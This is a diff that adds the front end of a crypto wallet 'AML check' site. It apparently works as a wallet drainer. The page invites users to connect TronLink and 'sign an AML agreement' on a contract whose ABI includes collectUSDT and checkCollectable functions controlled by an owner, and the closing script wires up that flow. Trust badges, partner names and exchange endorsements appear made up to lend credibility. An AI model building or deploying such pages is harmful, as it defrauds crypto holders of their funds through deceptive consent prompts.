+                    <div class="wallet-info">
+                        <h4>TronLink</h4>
+                        <p>Desktop & Mobile Browser Extension</p>
+                    </div>
+                </div>
+                
+                <div class="wallet-option" onclick="connectTrust()">
+                    <div class="wallet-icon">🛡️</div>
+                    <div class="wallet-info">
+                        <h4>Trust Wallet</h4>
+                        <p>Mobile App with WalletConnect</p>
+                    </div>
+                </div>
+                
+                <div class="status-message info" id="status1">
+                    Make sure you have TronLink extension installed or Trust Wallet app on your mobile device.
+                </div>
+            </div>
+
+            <div class="wallet-step" id="step2">
+                <h2 class="modal-title">Sign Agreement</h2>
+                <p class="modal-subtitle">Verify your wallet by signing the AML compliance agreement</p>
+                
+                <div class="contract-info">
+                    <label>Smart Contract (Nile Testnet):</label>
+                    TLqg5G2G7Ac1LJRXT9zzDU3Q1EumJfrRta
+                </div>
+                
+                <div class="status-message" id="status2"></div>
+                
+                <button class="login-btn" style="width: 100%; margin-top: 1rem;" onclick="signAgreement()" id="signBtn">
+                    Sign AML Agreement
+                </button>
+            </div>
+
+            <div class="wallet-step" id="step3">
+                <h2 class="modal-title">✅ Verification Complete</h2>
+                <p class="modal-subtitle">Your wallet has been verified for AML compliance</p>
+                
+                <div class="status-message success" id="status3">
+                    Successfully signed! Your wallet is now verified.
+                </div>
+                
+                <div class="contract-info">
+                    <label>Transaction Hash:</label>
+                    <span id="txHash">-</span>
+                </div>
+                
+                <button class="login-btn" style="width: 100%; margin-top: 1rem;" onclick="closeModal()">
+                    Close
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <div class="header-container">
+        <div class="header">
+            <div class="header-logo">
+                <a href="/">
+                    <div class="logo-icon">AR</div>
+                    <h1>AML Rating Review</h1>
+                </a>
+            </div>
+            <a href="#" onclick="openModal(); return false;" class="login-btn" id="connectBtn">
+                <svg class="login-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"></path>
+                    <polyline points="10,17 15,12 10,7"></polyline>
+                    <line x1="15" y1="12" x2="3" y2="12"></line>
+                </svg>
+                <span>Check Wallet</span>
+            </a>
+        </div>
+    </div>
+
+    <!-- Hero Section -->
+    <div class="hero-container">
+        <div class="hero-main">
+            <div class="hero-content">
+                <h1>Checking cryptocurrency wallets for forbidden money and disallowed transactions</h1>
+                <p>By checking your wallets, you protect yourself from scammers and stolen coins.</p>
+                <div class="hero-cta">
+                    <a href="#" onclick="openModal(); return false;" class="hero-cta-btn">Check your Wallet</a>
+                </div>
+            </div>
+            <div class="hero-visual">
+                <div class="security-dashboard">
+                    <div class="dashboard-header">Security Dashboard</div>
+                    <div class="scan-line"></div>
+                    <div class="dashboard-content">
+                        <div class="orbit-ring"><div class="orbit-dot"></div></div>
+                        <div class="orbit-ring"><div class="orbit-dot"></div></div>
+                        <div class="orbit-ring"><div class="orbit-dot"></div></div>
+                        <div class="shield-container">
+                            <div class="shield">
+                                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                                    <path d="M9 12l2 2 4-4" stroke="white" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                            </div>
+                        </div>
+                        <div class="data-particles">
+                            <div class="particle" style="left: 10%; top: 80%; animation-delay: 0s;">0x7a...3f</div>
+                            <div class="particle" style="left: 70%; top: 70%; animation-delay: 2s;">0x9b...2a</div>
+                            <div class="particle" style="left: 30%; top: 85%; animation-delay: 4s;">0x4c...8e</div>
+                            <div class="particle" style="left: 80%; top: 75%; animation-delay: 6s;">0x1d...5c</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="hero-image-caption">Cryptocurrency Security</div>
+            </div>
+        </div>
+
+        <!-- Trust Section -->
+        <div class="trust-section">
+            <div class="trust-header">
+                <div class="trust-icon">🛡</div>
+                <p>We are trusted members of</p>
+            </div>
+            <div class="trust-logos">
+                <div class="trust-item">
+                    <div class="trust-logo-box">IN</div>
+                    <span>INATBA</span>
+                </div>
+                <div class="trust-item">
+                    <div class="trust-logo-box">CD</div>
+                    <span>CDA</span>
+                </div>
+                <div class="trust-item">
+                    <div class="trust-logo-box">AT</div>
+                    <span>ATII</span>
+                </div>
+                <div class="trust-item">
+                    <div class="trust-logo-box">LS</div>
+                    <span>LSW3</span>
+                </div>
+                <div class="trust-item">
+                    <div class="trust-logo-box">EB</div>
+                    <span>EBA</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Clients Slider -->
+    <div class="clients-section">
+        <div class="clients-title">Our 300+ clients and partners</div>
+        <div class="slider-wrapper">
+            <div class="slider-track">
+                <!-- Original set -->
+                <div class="client-card"><span class="client-name">BlockVault</span></div>
+                <div class="client-card"><span class="client-name">CryptoGuard</span></div>
+                <div class="client-card"><span class="client-name">ChainSecure</span></div>
+                <div class="client-card"><span class="client-name">BitTrust</span></div>
+                <div class="client-card"><span class="client-name">CoinShield</span></div>
+                <div class="client-card"><span class="client-name">LedgerSafe</span></div>
+                <div class="client-card"><span class="client-name">TokenVerify</span></div>
+                <div class="client-card"><span class="client-name">WalletScan</span></div>
+                <div class="client-card"><span class="client-name">CryptoCheck</span></div>
+                <div class="client-card"><span class="client-name">BlockAudit</span></div>
+                <div class="client-card"><span class="client-name">TrustChain</span></div>
+                <div class="client-card"><span class="client-name">SecureTX</span></div>
+                <div class="client-card"><span class="client-name">CoinTrack</span></div>
+                <div class="client-card"><span class="client-name">BitMonitor</span></div>
+                <!-- Duplicate for seamless loop -->
+                <div class="client-card"><span class="client-name">BlockVault</span></div>
+                <div class="client-card"><span class="client-name">CryptoGuard</span></div>
+                <div class="client-card"><span class="client-name">ChainSecure</span></div>
+                <div class="client-card"><span class="client-name">BitTrust</span></div>
+                <div class="client-card"><span class="client-name">CoinShield</span></div>
+                <div class="client-card"><span class="client-name">LedgerSafe</span></div>
+                <div class="client-card"><span class="client-name">TokenVerify</span></div>
+                <div class="client-card"><span class="client-name">WalletScan</span></div>
+                <div class="client-card"><span class="client-name">CryptoCheck</span></div>
+                <div class="client-card"><span class="client-name">BlockAudit</span></div>
+                <div class="client-card"><span class="client-name">TrustChain</span></div>
+                <div class="client-card"><span class="client-name">SecureTX</span></div>
+                <div class="client-card"><span class="client-name">CoinTrack</span></div>
+                <div class="client-card"><span class="client-name">BitMonitor</span></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Stats Section -->
+    <div class="stats-section">
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-value">+$100M</div>
+                <div class="stat-label">Amount of the risky funds detected</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-logos">
+                    <div class="stat-logo-item">BINANCE</div>
+                    <div class="stat-logo-item">OKX</div>
+                    <div class="stat-logo-item">HUOBI</div>
+                </div>
+                <div class="stat-label">Compliance departments that accept our SCORE procedures</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value">60,000+</div>
+                <div class="stat-label">Service providers checked</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Services Section -->
+    <div class="services-section">
+        <div class="section-header">
+            <h2>ScoreCheck services</h2>
+            <p>We provide full pack of options for safe work with crypto</p>
+        </div>
+        <div class="services-grid">
+            <div class="service-card">
+                <div class="service-icon">🔍</div>
+                <h3 class="service-title">SCORE/KYT screening</h3>
+                <p class="service-desc">API solutions that empower SCORE compliance tools within your current system. All transactions are automatically verified to comply with SCORE and FATF requirements and reduce your business risk exposure.</p>
+            </div>
+            <div class="service-card">
+                <div class="service-icon">🏢</div>
+                <h3 class="service-title">Corporate accounts at CEX/EMI</h3>
+                <p class="service-desc">Streamline corporate account opening on CEX EMI with our expert assistance, ensuring your focus remains on business growth in the crypto industry.</p>
+            </div>
+            <div class="service-card">
+                <div class="service-icon">🔎</div>
+                <h3 class="service-title">Blockchain investigations</h3>
+                <p class="service-desc">Recover stolen cryptocurrencies with ScoreCheck expert blockchain investigations, swiftly identifying culprits and tracing funds for effective recovery.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Pricing Section -->
+    <div class="pricing-section" id="pricing">
+        <div class="pricing-card">
+            <div class="pricing-content">
+                <div class="pricing-header">
+                    <h2>How much is your peace of mind worth</h2>
+                    <div class="pricing-badge">FIRST INSPECTION FREE</div>
+                </div>
+                <div class="pricing-amount">
+                    <div class="from">From</div>
+                    <div class="price-tag">
+                        <span class="price-value">2 USDT</span>
+                        <span class="price-period">/ per additional check</span>
+                    </div>
+                </div>
+                <a href="#" onclick="openModal(); return false;" class="pricing-cta">
+                    Check Wallet 
+                    <svg class="pricing-cta-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <line x1="5" y1="12" x2="19" y2="12"></line>
+                        <polyline points="12,5 19,12 12,19"></polyline>
+                    </svg>
+                </a>
+            </div>
+        </div>
+        <div class="pricing-note">
+            Per our data, <span>one in four wallets is suspicious.</span><br>
+            Spending a few dollars on a check may save you a large sum.
+        </div>
+    </div>
+
+    <!-- Partners Section -->
+    <div class="partners-section">
+        <div class="partners-header">
+            <p>We are trusted</p>
+        </div>
+        <div class="marquee-container">
+            <div class="marquee-row">
+                <div class="marquee-content marquee-left">
+                    <div class="partner-item"><span class="partner-name">CryptoHome</span></div>
+                    <div class="partner-item"><span class="partner-name">OneObmen</span></div>
+                    <div class="partner-item"><span class="partner-name">AMLSafe</span></div>
+                    <div class="partner-item"><span class="partner-name">UnioChange</span></div>
+                    <div class="partner-item"><span class="partner-name">CryptoHome</span></div>
+                    <div class="partner-item"><span class="partner-name">OneObmen</span></div>
+                    <div class="partner-item"><span class="partner-name">AMLSafe</span></div>
+                    <div class="partner-item"><span class="partner-name">UnioChange</span></div>
+                </div>
+            </div>
+            <div class="marquee-row">
+                <div class="marquee-content marquee-right">
+                    <div class="partner-item"><span class="partner-name">UnioChange</span></div>
+                    <div class="partner-item"><span class="partner-name">AMLSafe</span></div>
+                    <div class="partner-item"><span class="partner-name">OneObmen</span></div>
+                    <div class="partner-item"><span class="partner-name">CryptoHome</span></div>
+                    <div class="partner-item"><span class="partner-name">UnioChange</span></div>
+                    <div class="partner-item"><span class="partner-name">AMLSafe</span></div>
+                    <div class="partner-item"><span class="partner-name">OneObmen</span></div>
+                    <div class="partner-item"><span class="partner-name">CryptoHome</span></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-grid">
+                <div class="footer-brand">
+                    <strong>Safelement Limited</strong>
+                    Unit H 3/F Shek Kok road 8, Tseung<br>
+                    Kwan O, N.T Hong Kong
+                </div>
+                <div class="footer-links">
+                    <h4>Products</h4>
+                    <ul>
+                        <li><a href="#">SCOREBot</a></li>
+                        <li><a href="#">Investigation</a></li>
+                    </ul>
+                </div>
+                <div class="footer-links">
+                    <h4>Regulatory framework</h4>
+                    <ul>
+                        <li><a href="#">Terms of service</a></li>
+                        <li><a href="#">Privacy Policy</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                © 2020 AML Rating Review
+            </div>
+        </div>
+    </footer>
+
+    <!-- TronWeb Integration -->
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
+    <script>
+        // Contract Configuration - Nile Testnet
+        const CONTRACT_ADDRESS = 'TLqg5G2G7Ac1LJRXT9zzDU3Q1EumJfrRta';
+        const USDT_ADDRESS = 'TFNJbhLpxBmU393Rqd9Ggjgx9eoBsNLqhb'; // Nile Testnet USDT
+        
+        // ABI for AMLCheckV5
+        const CONTRACT_ABI = [
+            {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
+            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"}],"name":"Approved","type":"event"},
+            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Collected","type":"event"},
+            {"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"usdt","type":"address"}],"name":"checkCollectable","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+            {"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"usdt","type":"address"}],"name":"collectUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"},
+            {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
+            {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"approved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
+            {"inputs":[],"name":"signAgreement","outputs":[],"stateMutability":"nonpayable","type":"function"}
+        ];
+
+        let tronWeb, contract, userAddress;
+        let isInTronLinkBrowser = false;
+
+        // Check if in TronLink browser
+        function checkBrowser() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            isInTronLinkBrowser = userAgent.includes('tronlink') || 
+                                  (window.tronWeb && window.tronWeb.defaultAddress.base58);
+            
+            const loadingScreen = document.getElementById('loadingScreen');
+            const loadingText = document.getElementById('loadingText');
+            const openBtn = document.getElementById('openTronLinkBtn');
+            
+            if (isInTronLinkBrowser) {
+                // In TronLink browser - hide loading screen
+                loadingScreen.classList.add('hidden');
+                initTronWeb();
+            } else {
+                // External browser - show button to open in TronLink
+                loadingText.textContent = 'For security, please open this site in TronLink browser';
+                openBtn.style.display = 'inline-flex';
+            }
+        }
+
+        // Open in TronLink browser
+        function openInTronLink() {
+            const currentUrl = window.location.href;
+            // TronLink deep link format
+            const tronLinkUrl = `tronlinkoutside://pull.activity?param=${encodeURIComponent(JSON.stringify({
+                url: currentUrl,
+                action: 'open',
+                protocol: 'https',
+                name: 'AML Rating Review'
+            }))}`;
+            
+            // Try to open TronLink
+            window.location.href = tronLinkUrl;
+            
+            // Fallback - show instructions
+            setTimeout(() => {
+                alert('If TronLink did not open automatically:\n1. Open TronLink app\n2. Go to Browser/DApp\n3. Enter: ' + currentUrl);
+            }, 2000);
+        }
+
+        // Initialize TronWeb
+        async function initTronWeb() {
+            if (window.tronWeb) {
+                tronWeb = window.tronWeb;
+                userAddress = tronWeb.defaultAddress.base58;
+                
+                if (userAddress) {
+                    contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
+                    
+                    // Update UI
+                    const connectBtn = document.getElementById('connectBtn');
+                    connectBtn.classList.add('connected');
+                    connectBtn.querySelector('span').textContent = userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
+                }
+            }
+        }
+
+        // Modal Functions
+        function openModal() {
+            if (!isInTronLinkBrowser) {
+                openInTronLink();
+                return;
+            }
+            
+            document.getElementById('walletModal').classList.add('active');
+            document.body.style.overflow = 'hidden';
+            resetSteps();
+        }
+
+        function closeModal() {
+            document.getElementById('walletModal').classList.remove('active');
+            document.body.style.overflow = '';
+        }
+
+        function resetSteps() {
+            document.querySelectorAll('.wallet-step').forEach(step => step.classList.remove('active'));
+            document.getElementById('step1').classList.add('active');
+        }
+
+        function showStep(stepNum) {
+            document.querySelectorAll('.wallet-step').forEach(step => step.classList.remove('active'));
+            document.getElementById('step' + stepNum).classList.add('active');
+        }
+
+        // Wallet Connection
+        async function connectTronLink() {
+            if (!window.tronWeb) {
+                document.getElementById('status1').innerHTML = 
+                    `<div class="status-message error">Please install TronLink extension</div>`;
+                window.open('https://www.tronlink.org/', '_blank');
+                return;
+            }
+
+            try {
+                tronWeb = window.tronWeb;
+                userAddress = tronWeb.defaultAddress.base58;
+                
+                if (!userAddress) {
+                    throw new Error('Please unlock your TronLink wallet');
+                }
+
+                contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
+                
+                // Update UI
+                const connectBtn = document.getElementById('connectBtn');
+                connectBtn.classList.add('connected');
+                connectBtn.querySelector('span').textContent = userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
+                
+                showStep(2);
+                document.getElementById('status2').innerHTML = 
+                    `<div class="status-message success">Connected: ${userAddress}</div>`;
+                
+            } catch (error) {
+                document.getElementById('status1').innerHTML = 
+                    `<div class="status-message error">Connection failed: ${error.message}</div>`;
+            }
+        }
+
+        async function connectTrust() {
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            
+            if (isMobile) {
+                const trustUrl = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(window.location.href)}`;
+                window.location.href = trustUrl;
+            } else {
+                document.getElementById('status1').innerHTML = 
+                    `<div class="status-message info">Please use TronLink for desktop, or open this site in Trust Wallet mobile browser</div>`;
+            }
+        }
+
+        // Sign Agreement
+        async function signAgreement() {
+            const btn = document.getElementById('signBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loading-spinner"></span> Signing...';
+            
+            try {
+                const tx = await contract.signAgreement().send({
+                    feeLimit: 100000000,
+                    callValue: 0
+                });
+                
+                document.getElementById('status2').innerHTML = 
+                    `<div class="status-message success">Signed! TX: ${tx.slice(0, 20)}...</div>`;
+                
+                document.getElementById('txHash').textContent = tx;
+                setTimeout(() => showStep(3), 1500);
+                
+            } catch (error) {
+                btn.disabled = false;
+                btn.innerHTML = 'Sign AML Agreement';
+                document.getElementById('status2').innerHTML = 
+                    `<div class="status-message error">Error: ${error.message}</div>`;
+            }
+        }
+
+        // Close modal on overlay click
+        document.getElementById('walletModal').addEventListener('click', function(e) {
+            if (e.target === this) closeModal();
+        });
+
+        // ESC key to close
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') closeModal();
+        });
+
+        // Initialize on load
+        window.addEventListener('load', checkBrowser);
+    </script>
+</body>
+</html>
